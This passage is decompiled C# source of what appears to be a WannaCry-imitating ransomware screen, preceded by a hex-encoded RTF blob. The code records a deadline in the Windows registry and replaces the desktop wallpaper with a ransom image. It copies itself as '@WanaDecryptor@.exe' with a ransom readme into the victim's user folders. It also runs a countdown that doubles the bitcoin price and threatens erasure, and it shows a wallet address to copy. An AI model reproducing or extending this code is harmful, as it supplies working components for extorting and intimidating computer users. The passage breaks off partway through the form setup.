aa69a6465c0e04ec69ffb9e65d0\r\n28d44d4e39df9c1a52ecbd3607fee9cec7263328e5d661d3d0e4f62f44acd855ed7ab33cdf7bcb8ae889599bd5c8b3029895b6825696f6af29c239b75a5bb1e6\r\n345e6ee6c28117e73586c1a2214ae1be07e93fb0ff51e133fb65426fa843be0fb515c187064d0cc206a2fa926d3c902e907670048d931db4c1a44959d366ad93\r\nb65abe595f70a75bf03d616c2dd959fc7d4e6317cd99cbcec9c58b34766661c7d6766ca1a9c1b327531486c6f941c638c67cd22a7f75e2a37be0e82db8df9f30\r\n254d30c1372581a1f51c983c80e4b71ccdd28dbf000000ffff0300504b0304140006000800000021000dd1909fb60000001b010000270000007468656d652f74\r\n68656d652f5f72656c732f7468656d654d616e616765722e786d6c2e72656c73848f4d0ac2301484f78277086f6fd3ba109126dd88d0add40384e4350d363f24\r\n51eced0dae2c082e8761be9969bb979dc9136332de3168aa1a083ae995719ac16db8ec8e4052164e89d93b64b060828e6f37ed1567914b284d262452282e3198\r\n720e274a939cd08a54f980ae38a38f56e422a3a641c8bbd048f7757da0f19b017cc524bd62107bd5001996509affb3fd381a89672f1f165dfe514173d9850528\r\na2c6cce0239baa4c04ca5bbabac4df000000ffff0300504b01022d0014000600080000002100828abc13fa0000001c0200001300000000000000000000000000\r\n000000005b436f6e74656e745f54797065735d2e786d6c504b01022d0014000600080000002100a5d6a7e7c0000000360100000b000000000000000000000000\r\n002b0100005f72656c732f2e72656c73504b01022d00140006000800000021006b799616830000008a0000001c00000000000000000000000000140200007468\r\n656d652f7468656d652f7468656d654d616e616765722e786d6c504b01022d001400060008000000210096b5ade296060000501b000016000000000000000000\r\n00000000d10200007468656d652f7468656d652f7468656d65312e786d6c504b01022d00140006000800000021000dd1909fb60000001b010000270000000000\r\n00000000000000009b0900007468656d652f7468656d652f5f72656c732f7468656d654d616e616765722e786d6c2e72656c73504b050600000000050005005d010000960a00000000}\r\n{\\*\\colorschememapping 3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d3822207374616e64616c6f6e653d22796573223f3e0d0a3c613a636c724d\r\n617020786d6c6e733a613d22687474703a2f2f736368656d61732e6f70656e786d6c666f726d6174732e6f72672f64726177696e676d6c2f323030362f6d6169\r\n6e22206267313d226c743122207478313d22646b3122206267323d226c743222207478323d22646b322220616363656e74313d22616363656e74312220616363\r\n656e74323d22616363656e74322220616363656e74333d22616363656e74332220616363656e74343d22616363656e74342220616363656e74353d22616363656e74352220616363656e74363d22616363656e74362220686c696e6b3d22686c696e6b2220666f6c486c696e6b3d22666f6c486c696e6b222f3e}\r\n{\\*\\latentstyles\\lsdstimax267\\lsdlockeddef0\\lsdsemihiddendef1\\lsdunhideuseddef1\\lsdqformatdef0\\lsdprioritydef99{\\lsdlockedexcept \\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority0 \\lsdlocked0 Normal;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 1;\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 2;\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 3;\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 4;\r\n\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 5;\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 6;\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 7;\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 8;\\lsdqformat1 \\lsdpriority9 \\lsdlocked0 heading 9;\r\n\\lsdpriority39 \\lsdlocked0 toc 1;\\lsdpriority39 \\lsdlocked0 toc 2;\\lsdpriority39 \\lsdlocked0 toc 3;\\lsdpriority39 \\lsdlocked0 toc 4;\\lsdpriority39 \\lsdlocked0 toc 5;\\lsdpriority39 \\lsdlocked0 toc 6;\\lsdpriority39 \\lsdlocked0 toc 7;\r\n\\lsdpriority39 \\lsdlocked0 toc 8;\\lsdpriority39 \\lsdlocked0 toc 9;\\lsdqformat1 \\lsdpriority35 \\lsdlocked0 caption;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority10 \\lsdlocked0 Title;\\lsdpriority1 \\lsdlocked0 Default Paragraph Font;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority11 \\lsdlocked0 Subtitle;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority22 \\lsdlocked0 Strong;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority20 \\lsdlocked0 Emphasis;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority59 \\lsdlocked0 Table Grid;\\lsdunhideused0 \\lsdlocked0 Placeholder Text;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority1 \\lsdlocked0 No Spacing;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority60 \\lsdlocked0 Light Shading;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority61 \\lsdlocked0 Light List;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority62 \\lsdlocked0 Light Grid;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority63 \\lsdlocked0 Medium Shading 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority64 \\lsdlocked0 Medium Shading 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority65 \\lsdlocked0 Medium List 1;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority66 \\lsdlocked0 Medium List 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority67 \\lsdlocked0 Medium Grid 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority68 \\lsdlocked0 Medium Grid 2;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority69 \\lsdlocked0 Medium Grid 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority70 \\lsdlocked0 Dark List;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority71 \\lsdlocked0 Colorful Shading;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority72 \\lsdlocked0 Colorful List;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority73 \\lsdlocked0 Colorful Grid;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority60 \\lsdlocked0 Light Shading Accent 1;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority61 \\lsdlocked0 Light List Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority62 \\lsdlocked0 Light Grid Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority63 \\lsdlocked0 Medium Shading 1 Accent 1;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority64 \\lsdlocked0 Medium Shading 2 Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority65 \\lsdlocked0 Medium List 1 Accent 1;\\lsdunhideused0 \\lsdlocked0 Revision;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority34 \\lsdlocked0 List Paragraph;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority29 \\lsdlocked0 Quote;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority30 \\lsdlocked0 Intense Quote;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority66 \\lsdlocked0 Medium List 2 Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority67 \\lsdlocked0 Medium Grid 1 Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority68 \\lsdlocked0 Medium Grid 2 Accent 1;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority69 \\lsdlocked0 Medium Grid 3 Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority70 \\lsdlocked0 Dark List Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority71 \\lsdlocked0 Colorful Shading Accent 1;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority72 \\lsdlocked0 Colorful List Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority73 \\lsdlocked0 Colorful Grid Accent 1;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority60 \\lsdlocked0 Light Shading Accent 2;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority61 \\lsdlocked0 Light List Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority62 \\lsdlocked0 Light Grid Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority63 \\lsdlocked0 Medium Shading 1 Accent 2;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority64 \\lsdlocked0 Medium Shading 2 Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority65 \\lsdlocked0 Medium List 1 Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority66 \\lsdlocked0 Medium List 2 Accent 2;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority67 \\lsdlocked0 Medium Grid 1 Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority68 \\lsdlocked0 Medium Grid 2 Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority69 \\lsdlocked0 Medium Grid 3 Accent 2;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority70 \\lsdlocked0 Dark List Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority71 \\lsdlocked0 Colorful Shading Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority72 \\lsdlocked0 Colorful List Accent 2;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority73 \\lsdlocked0 Colorful Grid Accent 2;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority60 \\lsdlocked0 Light Shading Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority61 \\lsdlocked0 Light List Accent 3;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority62 \\lsdlocked0 Light Grid Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority63 \\lsdlocked0 Medium Shading 1 Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority64 \\lsdlocked0 Medium Shading 2 Accent 3;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority65 \\lsdlocked0 Medium List 1 Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority66 \\lsdlocked0 Medium List 2 Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority67 \\lsdlocked0 Medium Grid 1 Accent 3;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority68 \\lsdlocked0 Medium Grid 2 Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority69 \\lsdlocked0 Medium Grid 3 Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority70 \\lsdlocked0 Dark List Accent 3;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority71 \\lsdlocked0 Colorful Shading Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority72 \\lsdlocked0 Colorful List Accent 3;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority73 \\lsdlocked0 Colorful Grid Accent 3;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority60 \\lsdlocked0 Light Shading Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority61 \\lsdlocked0 Light List Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority62 \\lsdlocked0 Light Grid Accent 4;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority63 \\lsdlocked0 Medium Shading 1 Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority64 \\lsdlocked0 Medium Shading 2 Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority65 \\lsdlocked0 Medium List 1 Accent 4;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority66 \\lsdlocked0 Medium List 2 Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority67 \\lsdlocked0 Medium Grid 1 Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority68 \\lsdlocked0 Medium Grid 2 Accent 4;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority69 \\lsdlocked0 Medium Grid 3 Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority70 \\lsdlocked0 Dark List Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority71 \\lsdlocked0 Colorful Shading Accent 4;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority72 \\lsdlocked0 Colorful List Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority73 \\lsdlocked0 Colorful Grid Accent 4;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority60 \\lsdlocked0 Light Shading Accent 5;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority61 \\lsdlocked0 Light List Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority62 \\lsdlocked0 Light Grid Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority63 \\lsdlocked0 Medium Shading 1 Accent 5;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority64 \\lsdlocked0 Medium Shading 2 Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority65 \\lsdlocked0 Medium List 1 Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority66 \\lsdlocked0 Medium List 2 Accent 5;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority67 \\lsdlocked0 Medium Grid 1 Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority68 \\lsdlocked0 Medium Grid 2 Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority69 \\lsdlocked0 Medium Grid 3 Accent 5;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority70 \\lsdlocked0 Dark List Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority71 \\lsdlocked0 Colorful Shading Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority72 \\lsdlocked0 Colorful List Accent 5;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority73 \\lsdlocked0 Colorful Grid Accent 5;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority60 \\lsdlocked0 Light Shading Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority61 \\lsdlocked0 Light List Accent 6;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority62 \\lsdlocked0 Light Grid Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority63 \\lsdlocked0 Medium Shading 1 Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority64 \\lsdlocked0 Medium Shading 2 Accent 6;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority65 \\lsdlocked0 Medium List 1 Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority66 \\lsdlocked0 Medium List 2 Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority67 \\lsdlocked0 Medium Grid 1 Accent 6;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority68 \\lsdlocked0 Medium Grid 2 Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority69 \\lsdlocked0 Medium Grid 3 Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority70 \\lsdlocked0 Dark List Accent 6;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority71 \\lsdlocked0 Colorful Shading Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority72 \\lsdlocked0 Colorful List Accent 6;\\lsdsemihidden0 \\lsdunhideused0 \\lsdpriority73 \\lsdlocked0 Colorful Grid Accent 6;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority19 \\lsdlocked0 Subtle Emphasis;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority21 \\lsdlocked0 Intense Emphasis;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority31 \\lsdlocked0 Subtle Reference;\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority32 \\lsdlocked0 Intense Reference;\r\n\\lsdsemihidden0 \\lsdunhideused0 \\lsdqformat1 \\lsdpriority33 \\lsdlocked0 Book Title;\\lsdpriority37 \\lsdlocked0 Bibliography;\\lsdqformat1 \\lsdpriority39 \\lsdlocked0 TOC Heading;}}{\\*\\datastore 010500000200000018000000\r\n4d73786d6c322e534158584d4c5265616465722e352e3000000000000000000000060000\r\nd0cf11e0a1b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001000000010000000000000000100000feffffff00000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nfffffffffffffffffdfffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffffffffffffec69d9888b8b3d4c859eaf6cd158be0f000000000000000000000000e0be\r\n4a7219cad201feffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000\r\n00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000\r\n000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000000000\r\n0000000000000000000000000000000000000000000000000105000000000000}}");
		try
		{
			if (Utils.RegGetVal(Utils.REGISTRY_KEY, "time") == null)
			{
				Registry.CurrentUser.OpenSubKey(Utils.REGISTRY_KEY, writable: true)!.SetValue("time", DateTime.Now.ToString());
			}
			startTime = DateTime.Parse((string)Utils.RegGetVal(Utils.REGISTRY_KEY, "time"));
			x2Time = startTime.AddDays(3.0);
			endTime = startTime.AddDays(6.0);
		}
		catch
		{
		}
		((Control)RiseDateLbl).set_Text(x2Time.ToString());
		((Control)EraseDateLbl).set_Text(endTime.ToString());
		SetProgress(0);
		Wallpaper.Set((Image)(object)Resources.wannacry, Wallpaper.Style.Stretched);
		PutInfo();
	}

	private void CloneSelf(string directory)
	{
		try
		{
			File.Copy(Assembly.GetEntryAssembly()!.Location, Path.Combine(directory, "@WanaDecryptor@.exe"));
			File.WriteAllText(Path.Combine(directory, "@Please_Read_Me@.txt"), Resources.readme);
		}
		catch
		{
		}
	}

	public void PutInfo()
	{
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.MyComputer));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.Templates));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		CloneSelf(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
	}

	public void SetProgress(int value)
	{
		((Control)LostProgress).set_Height((int)(0.9 * (double)value));
		((Control)RiseProgress).set_Height((((Control)LostProgress).get_Height() * 2 >= 90) ? 90 : (((Control)LostProgress).get_Height() * 2));
	}

	private void CheckPayment_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new CheckPaymentForm()).ShowDialog();
	}

	private void Decrypt_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new DecryptForm()).ShowDialog();
	}

	private void Contact_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new SendMessageForm()).ShowDialog();
	}

	private void Copy_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)Wallet).get_Text());
	}

	private void Counter_Tick(object sender, EventArgs e)
	{
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = x2Time - now;
		if (now >= x2Time)
		{
			((Control)RiseTimeLeft).set_Text("00:00:00:00");
			((Control)Price).set_Text(((Control)Price).get_Text().Replace("0.15", "0.30"));
		}
		else
		{
			((Control)RiseTimeLeft).set_Text($"{timeSpan.Days:00}:{timeSpan.Hours:00}:{timeSpan.Minutes:00}:{timeSpan.Seconds:00}");
		}
		timeSpan = endTime - now;
		double num = (endTime - startTime).TotalSeconds * 100.0 / timeSpan.TotalSeconds - 100.0;
		SetProgress((int)num);
		((Control)EraseTimeLeft).set_Text($"{timeSpan.Days:00}:{timeSpan.Hours:00}:{timeSpan.Minutes:00}:{timeSpan.Seconds:00}");
	}

	private void About_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
	}

	private void Howto_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.google.com/search?q=how+to+buy+bitcoin");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_03d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e0: Expected O, but got Unknown
		//IL_0478: Unknown result type (might be due to invalid IL or missing references)
		//IL_0482: Expected O, but got Unknown
		//IL_049f: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a9: Expected O, but got Unknown
		//IL_0524: Unknown result type (might be due to invalid IL or missing references)
		//IL_052e: Expected O, but got Unknown
		//IL_05a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05aa: Expected O, but got Unknown
		//IL_06ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f7: Expected O, but got Unknown
		//IL_07ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f4: Expected O, but got Unknown
		//IL_0873: Unknown result type (might be due to invalid IL or missing references)
		//IL_087d: Expected O, but got Unknown
		//IL_090e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0918: Expected O, but got Unknown
		//IL_09e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f1: Expected O, but got Unknown
		//IL_0a7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a86: Expected O, but got Unknown
		//IL_0b0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b17: Expected O, but got Unknown
		//IL_0ba1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bab: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		CheckPayment = new Button();
		Decrypt = new Button();
		Contact = new LinkLabel();
		About = new LinkLabel();
		Howto = new LinkLabel();
		Oops = new Label();
		Lock = new PictureBox();
		TimeLeft = new PictureBox();
		RiseProgress = new PictureBox();
		LostProgress = new PictureBox();
		pictureBox2 = new PictureBox();
		Help = new RichTextBox();
		Wallet = new Label();
		Copy = new PictureBox();
		Price = new Label();
		Counter = new Timer(components);
		RiseDateLbl = new Label();
		EraseDateLbl = new Label();
		RiseTimeLeft = new Label();
		EraseTimeLeft = new Label();
		((ISupportInitialize)Lock).BeginInit();
		((ISupportInitialize)TimeLeft).BeginInit();
		((ISupportInitialize)RiseProgress).BeginInit();
		((ISupportInitialize)LostProgress).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)Copy).BeginInit();
		((Control)this).SuspendLayout();
		((Control)CheckPayment).set_Font(new Font("Microsoft Sans Serif", 11f, (FontStyle)1));
		((Control)CheckPayment).set_Location(new Point(243, 546));
		((Control)CheckPayment).set_Name("CheckPayment");
		((Control)CheckPayment).set_Size(new Size(268, 29));
		((Control)CheckPayment).set_TabIndex(0);
		((Control)CheckPayment).set_Text("Check payment");
		((ButtonBase)CheckPayment).set_UseVisualStyleBackColor(true);
		((Control)CheckPayment).add_Click((EventHandler)CheckPayment_Click);
		((Control)Decrypt).set_Font(new Font("Microsoft Sans Serif", 11f, (FontStyle)1));
		((Control)Decrypt).set_Location(new Point(542, 546));
		((Control)Decrypt).set_Name("Decrypt");
		((Control)Decrypt).set_Size(new Size(268, 29));
		((Control)Decrypt).set_TabIndex(1);
		((Control)Decrypt).set_Text("Decrypt");
		((ButtonBase)Decrypt).set_UseVisualStyleBackColor(true);
		((Control)Decrypt).add_Click((EventHandler)Decrypt_Click);
		((Control)Contact).set_AutoSize(true);
		((Control)Contact).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		Contact.set_LinkColor(Color.FromArgb(123, 237, 206));
		((Control)Contact).set_Location(new Point(25, 546));
		((Control)Contact).set_Name("Contact");
